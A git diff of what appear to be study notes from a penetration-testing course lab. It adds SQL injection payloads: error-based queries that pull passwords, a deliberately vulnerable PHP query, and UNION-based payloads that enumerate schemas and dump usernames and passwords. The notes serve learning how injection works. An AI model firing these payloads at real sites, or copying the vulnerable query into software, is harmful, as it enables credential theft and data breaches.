@@ -13,14 +13,16 @@ MySQL [(none)]> select version();
 | 8.0.21    |
 +-----------+
 1 row in set (0.107 sec)
+```
 
+```sql
 # look system user
 # database-specific root user, not the the system-wide administrative root user
 
 MySQL [(none)]> select system_user();
 +--------------------+
 | system_user()      |
-+--------------------+
++--------------------+git 
 | root@192.168.20.50 |
 +--------------------+
 1 row in set (0.104 sec)
@@ -73,4 +75,54 @@ SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
 ```bash
 # attampt to retrieve user table
 ' OR 1=1 in (SELECT * FROM users) -- //
+```
+
+```bash
+# attampt to retrieve password from user table
+' or 1=1 in (SELECT password FROM users) -- //
+```
+
+```bash
+# improving SQLi error-based payload
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+## UNION-based
+
+```php
+# VULNERABLE CODE BLOCK
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
+
+```sql
+# Verifying the exact number of columns
+' ORDER BY 1-- //
+' ORDER BY 2-- //
+' ORDER BY 3-- //
+' ORDER BY 69-- //
+```
+
+```sql
+# Enumerating the Database via SQL UNION Injection
+%' UNION SELECT database(), user(), @@version, null, null-- //
+```
+
+```sql
+# fixing the injected UNION query if the frontend dont show all columns
+' UNION SELECT null, null, database(), user(), @@version -- //
+```
+
+```sql
+# Retrieving Current Database Tables and Columns
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
+
+```sql
+# Retrieve user data
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+```sql
+# from lab inside post request body, confirming the version
+mail-list=email.com' UNION SELECT @@version, @@version, @@version, @@version, @@version, @@version-- //
 ```
